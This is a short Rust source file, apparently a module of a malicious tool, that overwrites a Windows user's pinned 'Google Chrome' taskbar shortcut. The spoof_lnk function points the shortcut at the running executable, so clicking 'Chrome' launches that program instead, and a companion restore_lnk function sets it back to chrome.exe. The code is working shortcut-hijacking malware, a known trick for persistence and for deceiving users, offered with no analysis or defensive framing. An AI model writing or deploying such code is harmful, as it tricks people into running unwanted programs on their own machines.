use mslnk::ShellLink;
use std::path::PathBuf;

pub fn spoof_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {

    let exe_path = std::env::current_exe()?;
    let start_in = exe_path.parent()
        .ok_or("Failed to get parent directory of the executable")?;
    let exe_path_str = exe_path.to_str()
        .ok_or("Executable path contains invalid UTF-8 characters")?;
    let start_in_str = start_in.to_str()
        .ok_or("Working directory path contains invalid UTF-8 characters")?;

    let mut link = ShellLink::new(exe_path_str)?;
    link.set_working_dir(Some(start_in_str.to_string()));
    let shortcut_path = PathBuf::from(format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
    link.create_lnk(&shortcut_path)?;

    Ok(())
}

pub fn restore_lnk(username: String) -> Result<(), Box<dyn std::error::Error>> {
    let target = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    let start_in = "C:\\Program Files\\Google\\Chrome\\Application";

    let mut link = ShellLink::new(target.to_string())?;
    link.set_working_dir(Some(start_in.to_string()));
    let shortcut_path: PathBuf = PathBuf::from(&format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username));
    link.create_lnk(&shortcut_path)?;

    Ok(())
}
